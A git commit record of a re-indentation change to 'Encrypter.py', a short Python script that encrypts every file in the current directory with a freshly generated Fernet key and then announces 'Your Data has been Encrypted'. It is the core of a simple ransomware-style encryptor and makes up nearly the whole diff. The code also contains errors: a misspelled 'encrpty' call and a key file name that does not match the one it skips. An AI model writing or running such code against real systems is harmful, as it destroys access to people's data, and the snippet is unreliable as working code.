7489e3097794ace9129ebea2b508217aa8a2aa26
JBN <128038111+Joe-BN@users.noreply.github.com>
2023-05-04 12:18:04 +0300

    Update Encrypter.py

--- Encrypter.py
+++ Encrypter.py
@@ -2,20 +2,20 @@ from cryptography.fernet import Fernet
 
 files = []
 for file in os.listdir():
-  if file == "Encrypter.py" or file == "thekey.key" or file == "Decrypter.py":
-    continue
-  files.append(file)
+    if file == "Encrypter.py" or file == "thekey.key" or file == "Decrypter.py":
+            continue
+    files.append(file)
   
 key = Fernet.generate_key()
 with open("thekey", "wb") as thekey:
-  thekey.write(key)
+    thekey.write(key)
 
   
 for file in files:
-  with open(file, "rb") as thefile:
-    contents = thefile.read()
-  contents_encrypted = Fernet(key).encrpty(contents)
-  with open(file, "wb") as thefile:
-    thefile.write(contents_encrypted)
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrpty(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
     
 print("Your Data has been Encrypted")
